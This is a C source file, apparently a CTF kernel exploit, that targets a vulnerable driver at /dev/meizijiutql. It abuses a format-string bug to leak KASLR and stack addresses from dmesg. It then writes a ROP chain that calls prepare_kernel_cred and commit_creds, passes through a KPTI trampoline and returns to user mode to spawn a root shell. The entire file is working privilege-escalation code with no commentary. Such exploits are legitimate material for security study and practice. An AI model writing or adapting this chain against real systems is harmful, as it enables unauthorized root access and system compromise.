// author: @eastXueLian
// usage : musl-gcc ./exp.c -static -masm=intel -o ./rootfs/exp

#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#define lg(X) printf("\033[1;31;40m[*] %s --> 0x%lx \033[0m\n", (#X), (X))
#define COMMIT_CREDS 0xffffffff81081410
#define MAGIC_GADGET                                                           \
  0xffffffff8138e238 // mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8138e229 ;
                     // ret

size_t kaslr_offset, commit_creds_addr, pop_rdi_ret, stack_base;
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;");
  puts("[*]status has been saved.");
}
void get_shell(void) { system("/bin/sh"); }

int main() {
  save_status();
  signal(SIGSEGV, get_shell);

  int fd = open("/dev/meizijiutql", 2);
  char buf[0x300];
  size_t ROP[0x100];
  strcpy(buf, "%llx%llx%llx%llx%llxKASLR-LEAK: 0x%llx\n");
  ioctl(fd, 0x73311337, 0x100);
  write(fd, buf, 0x100);
  ioctl(fd, 0xDEADBEEF);
  ioctl(fd, 0x13377331);

  strcpy(buf, "%llx%llx%llx%llx%llx%llx%llx%llx%llxSTACK-LEAK: 0x%llx\n");
  ioctl(fd, 0x73311337, 0x100);
  write(fd, buf, 0x100);
  ioctl(fd, 0xDEADBEEF);
  ioctl(fd, 0x13377331);

  system("dmesg > /tmp/leak");
  FILE *fd_leak = fopen("/tmp/leak", "r");
  char *found_str;
  while (1) {
    fgets(buf, 0x100, fd_leak);
    if (found_str = strstr(buf, "KASLR-LEAK: 0x")) {
      found_str = strstr(found_str, "0x");
      kaslr_offset = strtoul(found_str, NULL, 16) - 0xffffffff811c827f;
      commit_creds_addr = COMMIT_CREDS + kaslr_offset;
      pop_rdi_ret = kaslr_offset + 0xffffffff81001388;
      lg(kaslr_offset);
      lg(commit_creds_addr);
      lg(pop_rdi_ret);
    }
    if (found_str = strstr(buf, "STACK-LEAK: 0x")) {
      found_str = strstr(found_str, "0x");
      stack_base = strtoul(found_str, NULL, 16) - 0x58;
      lg(stack_base);
      break;
    }
  }

  size_t magic_gadget =
      kaslr_offset + 0xffffffff8138e238; // mov rdi, rax ; cmp rcx, rsi ; ja
                                         // 0xffffffff8138e229 ; ret
  size_t pop_rsi_ret = kaslr_offset + 0xffffffff81001fbd;
  size_t pop_rcx_ret = kaslr_offset + 0xffffffff810674ff;
  size_t kpti_trampoline = kaslr_offset + 0xffffffff81a00985; // pop2
  size_t prepare_kernel_cred_addr = kaslr_offset + 0xffffffff81081790;

  for (int i = 0; i < 0x280; i++) {
    buf[i] = 0;
  }
  *(size_t *)(buf + 0x200) = stack_base - 0x80;

  int j = 0;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = 0xdeadbeef;
  ROP[j++] = pop_rdi_ret;
  ROP[j++] = 0;
  ROP[j++] = prepare_kernel_cred_addr;
  ROP[j++] = pop_rcx_ret;
  ROP[j++] = 0;
  ROP[j++] = magic_gadget;
  ROP[j++] = commit_creds_addr;
  ROP[j++] = kpti_trampoline;
  ROP[j++] = 0;
  ROP[j++] = 0;
  ROP[j++] = (size_t)get_shell;
  ROP[j++] = user_cs;
  ROP[j++] = user_rflags;
  ROP[j++] = user_sp;
  ROP[j++] = user_ss;

  ioctl(fd, 0x73311337, 0x200);
  ioctl(fd, 0x73311337, 0x200);
  write(fd, buf, 0x208);
  ioctl(fd, 0x73311337, 0x200);
  ioctl(fd, 0x73311337, 0x200);
  write(fd, ROP, j * 8);

  return 0;
}
